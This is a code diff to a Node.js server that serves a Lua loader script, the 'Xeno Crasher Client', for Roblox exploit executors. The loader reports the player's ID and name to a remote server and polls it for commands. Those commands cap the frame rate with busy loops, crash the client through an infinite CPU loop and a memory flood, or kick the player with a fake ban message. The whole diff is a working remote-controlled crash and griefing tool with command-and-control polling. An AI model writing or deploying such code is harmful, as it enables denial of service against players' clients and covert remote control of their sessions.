@@ -7,6 +7,9 @@ const PORT = process.env.PORT || 3000;
 
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';
 
+// ============================================
+// ✅ CORS - ALLOWS ROBLOX TO CONNECT
+// ============================================
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST', 'OPTIONS'],
@@ -20,43 +23,41 @@ const players = new Map();
 // LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher Client v2 ]]--
+    const loader = `--[[ Xeno Crasher Client ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY  = "xenooooo"
 
 -- ============================================
--- HTTP REQUEST DETECTION
+-- SIMPLE HTTP - WORKS ON ALL EXECUTORS
 -- ============================================
-local function findHttpFunction()
+local function sendRequest(url, method, data)
+    local HttpService = game:GetService("HttpService")
+    HttpService.HttpEnabled = true
+    
+    -- Try different HTTP methods
     local functions = {
-        syn and syn.request,
-        request,
-        http and http.request,
-        http_request,
-        fluxus and fluxus.request,
-        getgenv and getgenv().request,
-        getrenv and getrenv().request,
-        shared and shared.request,
-        function(url, options)
-            return game:GetService("HttpService"):PostAsync(
-                url,
-                options.Body or "",
-                Enum.HttpContentType.ApplicationJson
-            )
+        function() return syn and syn.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
+        function() return request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
+        function() return http and http.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
+        function() return fluxus and fluxus.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
+        function() return http_request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
+        function()
+            if method == "POST" then
+                return HttpService:PostAsync(url, data or "", Enum.HttpContentType.ApplicationJson)
+            else
+                return HttpService:GetAsync(url)
+            end
         end
     }
     
-    for _, func in ipairs(functions) do
-        if type(func) == "function" then
-            return func
+    for _, fn in ipairs(functions) do
+        local success, result = pcall(fn)
+        if success and result then
+            return result
         end
     end
+    
     return nil
-end
-
-local request = findHttpFunction()
-if not request then
-    error("❌ No HTTP function found!")
 end
 
 local Players = game:GetService("Players")
@@ -96,7 +97,7 @@ local function createGUI()
     
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 1, 0)
-    label.Text = "✅ Connected to Xeno Crasher"
+    label.Text = "✅ Xeno Crasher Loaded"
     label.TextColor3 = Color3.fromRGB(100, 255, 100)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.SourceSansBold
@@ -113,20 +114,21 @@ createGUI()
 -- ============================================
 local function heartbeat()
     safe(function()
-        pcall(function()
-            return request({
-                Url = BASE .. "/api/public/heartbeat",
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-                Body = HttpService:JSONEncode({
-                    user_id = LP.UserId,
-                    username = LP.Name,
-                    display_name = LP.DisplayName,
-                    executor = "XenoClient",
-                    online = true
-                }),
-            })
-        end)
+        local data = HttpService:JSONEncode({
+            user_id = LP.UserId,
+            username = LP.Name,
+            display_name = LP.DisplayName,
+            executor = "XenoClient",
+            online = true
+        })
+        
+        local result = sendRequest(BASE .. "/api/public/heartbeat", "POST", data)
+        
+        if result then
+            print("❤️ Heartbeat sent!")
+        else
+            print("⚠️ Heartbeat failed")
+        end
     end)
 end
 
@@ -137,7 +139,7 @@ local fpsConnection = nil
 local fpsActive = false
 
 local function setFPSLimit(targetFPS)
-    print("🎯 Setting FPS to: " .. tostring(targetFPS))
+    print("🎯 FPS: " .. tostring(targetFPS))
     
     if fpsConnection then
         fpsConnection:Disconnect()
@@ -146,7 +148,6 @@ local function setFPSLimit(targetFPS)
     end
     
     if not targetFPS or targetFPS <= 0 then
-        print("✅ FPS limit disabled")
         return
     end
     
@@ -155,83 +156,46 @@ local function setFPSLimit(targetFPS)
     
     fpsConnection = RunService.RenderStepped:Connect(function()
         local startTime = tick()
-        while tick() - startTime < frameTime and fpsActive do
-            -- Busy loop to cap FPS
-        end
+        while tick() - startTime < frameTime and fpsActive do end
     end)
 end
 
 -- ============================================
--- POLL - RECEIVES COMMANDS
+-- POLL
 -- ============================================
 local function poll()
     safe(function()
-        local success, result = pcall(function()
-            return request({
-                Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
-                Method = "GET",
-                Headers = { ["X-Api-Key"] = KEY },
-            })
-        end)
+        local result = sendRequest(BASE .. "/api/public/command?user_id=" .. LP.UserId, "GET")
         
-        if success and result and result.Body then
-            local data = HttpService:JSONDecode(result.Body)
+        if result and result ~= "" then
+            local data = HttpService:JSONDecode(result)
             print("📥 Received: " .. HttpService:JSONEncode(data))
             
-            -- FPS LIMIT
             if data.fps_limit then
-                local targetFPS = tonumber(data.fps_limit)
-                if targetFPS and targetFPS > 0 then
-                    setFPSLimit(targetFPS)
-                else
-                    setFPSLimit(nil)
-                end
+                setFPSLimit(tonumber(data.fps_limit))
+            else
+                setFPSLimit(nil)
             end
             
-            -- CRASH
             if data.crash == true then
-                print("💥 CRASH COMMAND RECEIVED!")
-                
-                -- Method 1: Infinite loop
+                print("💥 CRASH!")
                 task.spawn(function()
                     while true do
                         local x = 0
-                        for i = 1, 1000000 do
-                            x = x + i
-                        end
+                        for i = 1, 1000000 do x = x + i end
                     end
                 end)
-                
-                -- Method 2: Memory flood
                 task.spawn(function()
                     local t = {}
                     while true do
-                        for i = 1, 1000 do
-                            t[#t + 1] = string.rep("X", 50000)
-                        end
+                        for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
                         task.wait()
-                    end
-                end)
-                
-                -- Method 3: Part spam
-                task.spawn(function()
-                    for i = 1, 5000 do
-                        local p = Instance.new("Part")
-                        p.Size = Vector3.new(100, 100, 100)
-                        p.Parent = workspace
-                        p.Position = Vector3.new(
-                            math.random(-1000, 1000),
-                            math.random(-1000, 1000),
-                            math.random(-1000, 1000)
-                        )
-                        task.wait(0.01)
                     end
                 end)
             end
             
-            -- KICK
             if data.kick == true then
-                print("👢 KICK COMMAND RECEIVED!")
+                print("👢 KICK!")
                 task.wait(0.5)
                 LP:Kick("You have been banned.")
             end
@@ -246,15 +210,14 @@ heartbeat()
 poll()
 
 task.spawn(function()
-    while task.wait(3) do heartbeat() end
+    while task.wait(5) do heartbeat() end
 end)
 
 task.spawn(function()
-    while task.wait(0.5) do poll() end
+    while task.wait(1) do poll() end
 end)
 
-print("✅ Xeno Crasher loaded successfully!")
-print("🔗 Connected to: " .. BASE)
+print("✅ Xeno Crasher loaded!")
 print("👤 Player: " .. LP.Name)
 `;
 
